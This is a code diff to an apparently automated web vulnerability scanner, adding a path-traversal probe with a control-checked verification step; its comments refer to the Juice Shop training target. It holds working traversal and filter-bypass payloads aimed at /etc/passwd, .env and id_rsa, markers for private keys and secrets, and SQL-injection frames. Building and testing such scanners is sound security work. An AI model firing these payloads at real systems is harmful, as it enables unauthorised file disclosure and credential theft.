@@ -37,6 +37,10 @@ from src.adaptix.security.scope import endpoint_key
 from src.adaptix.workflow.events import log
 
 MAX_PARAMS = 4
+# Traversal is capped separately: MAX_PARAMS is tuned for the injection probe, and the
+# ranking that decides which directory holds files is not the same question. Sharing the
+# cap let `/ftp` sit exactly on the boundary -- one extra route and the leak was gone.
+TRAVERSAL_MAX_BASES = 6
 MAX_CHECKS = 4
 # Bounded integer range tried against a detail route. The route's own response
 # decides attribution, so a wrong id simply fails to join and costs one read.
@@ -56,6 +60,38 @@ OWNER_FIELDS = ('owner', 'username', 'user', 'email', 'UserId', 'user_id', 'owne
 # return the unfiltered collection; the falsy twin must return nothing.
 INJECTION_FRAMES = ("{v}')) OR 1=1--", "{v}' OR 1=1--", "{v}') OR 1=1--",
                     "{v}' OR 1=1 --", '{v}" OR 1=1--', "{v}')) --")
+
+# Path-traversal payloads, as path suffixes appended to a directory the run observed.
+# Three encodings from the threat model plus two filter-bypass shapes measured on
+# real targets: a NUL terminator (the server truncates the name it checks but reads
+# the whole path) and doubled separators (`....//` collapses to `../` after one
+# normalisation pass). Each entry is (label, suffix); the suffix replaces the file
+# name, so `/ftp/x` becomes `/ftp/<suffix>`.
+TRAVERSAL_FRAMES = (
+    ('dotdot', '../package.json'),
+    ('encoded', '%2e%2e%2fpackage.json'),
+    ('doubled', '....//package.json'),
+    ('nul_bak', 'package.json.bak%2500.md'),
+    ('nul_encoded', '%2e%2e%2fpackage.json.bak%2500.md'),
+    ('deep', '../../../../../../etc/passwd'),
+)
+
+# Files whose disclosure is unambiguous. Matching the *body* is what decides; the
+# payload only selects where to look. ``/etc/passwd`` and ``win.ini`` are the
+# canonical targets, and a dotfile backup is the same defect on a web root.
+TRAVERSAL_TARGETS = ('package.json', 'package.json.bak', 'etc/passwd', 'win.ini',
+                     '.env', 'id_rsa', 'web.config', 'package-lock.json')
+
+# Body markers that prove one of those files came back. Kept separate from
+# web_signatures.TRAVERSAL_MARKERS (which gates on a traversal token appearing in
+# the response) because here the probe injected the token itself.
+TRAVERSAL_BODY_MARKERS = (
+    'root:x:0:0:', 'daemon:x:', 'nobody:x:',
+    '[boot loader]', '[extensions]', '; for 16-bit app support',
+    'BEGIN OPENSSH PRIVATE KEY', 'BEGIN RSA PRIVATE KEY',
+    '"name": "juice-shop"', '"dependencies"', '"scripts"',
+    'APP_SECRET', 'DB_PASSWORD', '-----BEGIN',
+)
 
 
 def _slug(url):
@@ -503,6 +539,176 @@ def injection_probe(state):
     for extra in events[1:]:
         merged = log({**state, 'events': merged}, extra)
     return {'injection_findings': findings, 'verification_evidence': evidence,
+            'execution_metrics': metrics, 'raw_bytes': raw,
+            'errors': list(state.get('errors') or []) + errors, 'events': merged}
+
+
+# ----------------------------------------------------------------------- traversal
+
+# Directory names that conventionally hold user-visible files. Used only to rank
+# candidates, never to invent one: a candidate must still be a directory the run
+# observed, and the payload still has to disclose a real file.
+_FILE_DIR_NAMES = ('ftp', 'files', 'file', 'uploads', 'upload', 'download', 'downloads',
+                   'static', 'assets', 'media', 'docs', 'backup', 'backups', 'public',
+                   'data', 'export', 'tmp', 'log', 'logs', 'private', 'attachments')
+
+
+def _file_directories(state):
+    """Directories that provably hold files, ranked so the likely ones are probed first.
+
+    An earlier version treated every observed path as a directory, so ``/rest/user/login``
+    and ``/api/Users`` became bases and sixty-nine candidates pushed the real one
+    (``/ftp``) past the cap -- the probe then reported honestly that nothing was found,
+    on a target that does leak a file. A traversal base must be a directory whose
+    relationship to a file is known:
+
+      * a sibling file was observed (``/ftp/legal.md`` proves ``/ftp``), or
+      * the route *is* a directory name that conventionally serves files
+        (``/ftp``, ``/uploads``), which is a candidate rather than a proof.
+
+    Ranking puts a sibling-file base first, then a name from the conventional list, then
+    the rest, so a shallow cap cannot hide the only base worth testing.
+    """
+    proven, likely = {}, {}
+    observed = []
+    for row in list(state.get('web_routes') or []) + list(state.get('api_operations') or []):
+        url = str(row.get('url') if isinstance(row, dict) else row or '')
+        if url.startswith('http'):
+            observed.append(url)
+    for url in observed:
+        parsed = urlsplit(url)
+        path = parsed.path.rstrip('/')
+        if not path:
+            continue
+        last = path.rsplit('/', 1)[-1]
+        if '.' in last and not last.startswith('.'):
+            # A file was observed here, so its parent is a real file directory.
+            base = path.rsplit('/', 1)[0] or '/'
+            root = urlunsplit(parsed._replace(path=base, query='', fragment=''))
+            proven.setdefault(root, base)
+        elif last.lower() in _FILE_DIR_NAMES:
+            root = urlunsplit(parsed._replace(query='', fragment=''))
+            likely.setdefault(root, path)
+    # Rank by how much the base looks like a file container, not by which bucket it
+    # fell into. A conventional container name (`/ftp`) outranks a bare parent that only
+    # holds files by accident (`/` because `styles.css` was observed): on Juice Shop the
+    # ordering decided whether `/ftp` survived the cap at all, which is the difference
+    # between reporting the leak and reporting nothing.
+    def _rank(item):
+        root, path = item
+        depth = len([seg for seg in path.split('/') if seg])
+        conventional = path.rstrip('/').rsplit('/', 1)[-1].lower() in _FILE_DIR_NAMES
+        return (0 if conventional else 1, depth, -len(path))
+
+    merged = dict(proven)
+    for root, path in likely.items():
+        merged.setdefault(root, path)
+    ranked = sorted(merged.items(), key=_rank)
+    return dict(ranked)
+
+
+def _traversal_detections(text):
+    """Body markers proving a sensitive file came back, in the probe's own words."""
+    lowered = (text or '').lower()
+    found = []
+    for marker in TRAVERSAL_BODY_MARKERS:
+        if marker.lower() in lowered:
+            found.append({'category': 'path_traversal', 'signature': marker})
+    return found
+
+
+def traversal_probe(state):
+    """Decide path traversal from a sensitive file the payload disclosed, vs a clean control.
+
+    The control is the same directory with the nominal file name, which must NOT
+    contain a sensitive-file marker. Without that control a marker already present on
+    the page (a listing that names ``package.json.bak``, say) would be read as a
+    disclosure the probe caused. Choosing the file name last and the baseline first
+    keeps the comparison honest.
+    """
+    directories = _file_directories(state)
+    if not directories:
+        return {'events': log(state, 'Traversal Probe: skipped; no file-backed directory observed')}
+    identities = _identity_maps(state)
+    headers = identities[next(iter(identities))] if identities else {}
+
+    session = _Session(state)
+    evidence = list(state.get('verification_evidence') or [])
+    findings, skipped = [], []
+    try:
+        for root, base in list(directories.items())[:TRAVERSAL_MAX_BASES]:
+            parsed = urlsplit(root)
+            # Baseline: the directory as observed. Its body is the control. Stored
+            # whole (CONTROL_EXCERPT) because a truncated control can never be
+            # trusted clean -- 'no marker in what we kept' is not 'no marker'.
+            clean_response = session.get(root, headers)
+            if clean_response is None:
+                continue
+            clean_record = session.record(clean_response, state, limit=CONTROL_EXCERPT)
+
+            tried = 0
+            for label, suffix in TRAVERSAL_FRAMES:
+                target_path = parsed.path.rstrip('/') + '/' + suffix
+                probe_url = urlunsplit(parsed._replace(path=target_path, query='', fragment=''))
+                response = session.get(probe_url, headers)
+                if response is None:
+                    continue
+                tried += 1
+                body = response.text
+                detected = _traversal_detections(body)
+                if not detected:
+                    continue
+                # A marker in the probe response only counts if the same directory
+                # served without the payload did not already carry it.
+                if _traversal_detections(clean_record.get('body_excerpt', '')):
+                    skipped.append('%s: marker present in the control; not caused by the payload'
+                                   % probe_url)
+                    break
+                row = session.record(response, state, limit=CONTROL_EXCERPT)
+                controls = [dict(clean_record, url=root, control=True, detected=[],
+                                 excerpt_truncated=clean_record['body_truncated'])]
+                try:
+                    proof = record_probe_verification(
+                        state, 'adaptix-traversal-' + _slug(probe_url) + '-' + label,
+                        probe_url, 'GET',
+                        {'method': 'GET', 'url': probe_url, 'identity': None},
+                        row, detected, controls)
+                except ValueError as exc:
+                    skipped.append('%s: %s' % (probe_url, str(exc)[:100]))
+                    continue
+                if proof is None:
+                    skipped.append('%s: contract did not confirm (%s)'
+                                   % (probe_url, sorted({d['signature'] for d in detected})[:3]))
+                    continue
+                evidence.append(proof)
+                if proof.get('result') == 'confirmed':
+                    # The record must carry the template_id and the signed proof: reflection
+                    # looks a finding up by template_id, and a row without one is rebuilt as
+                    # `inconclusive` however good the evidence behind it was.
+                    findings.append({'source_tool': 'traversal_probe', 'target': probe_url,
+                                     'parameter': 'path', 'payload': suffix,
+                                     'encoding': label,
+                                     'template_id': proof.get('template_id'),
+                                     'evidence_ref': proof.get('evidence_ref'),
+                                     'verification_evidence': proof,
+                                     'verification_status': 'verified',
+                                     'verification_basis': 'path_traversal',
+                                     'contract': CONTRACT_REQUIREMENTS['path_traversal']})
+                    break
+            if tried and not findings:
+                skipped.append('%s: no payload disclosed a sensitive file' % root)
+    finally:
+        errors = session.errors
+        metrics = session.metrics
+        raw = session.raw
+        session.close()
+
+    events = ['Traversal Probe: %d confirmed, %d skipped' % (len(findings), len(skipped))]
+    events += ['Traversal Probe: ' + reason for reason in (skipped + errors)[:4]]
+    merged = log(state, events[0])
+    for extra in events[1:]:
+        merged = log({**state, 'events': merged}, extra)
+    return {'traversal_findings': findings, 'verification_evidence': evidence,
             'execution_metrics': metrics, 'raw_bytes': raw,
             'errors': list(state.get('errors') or []) + errors, 'events': merged}
 
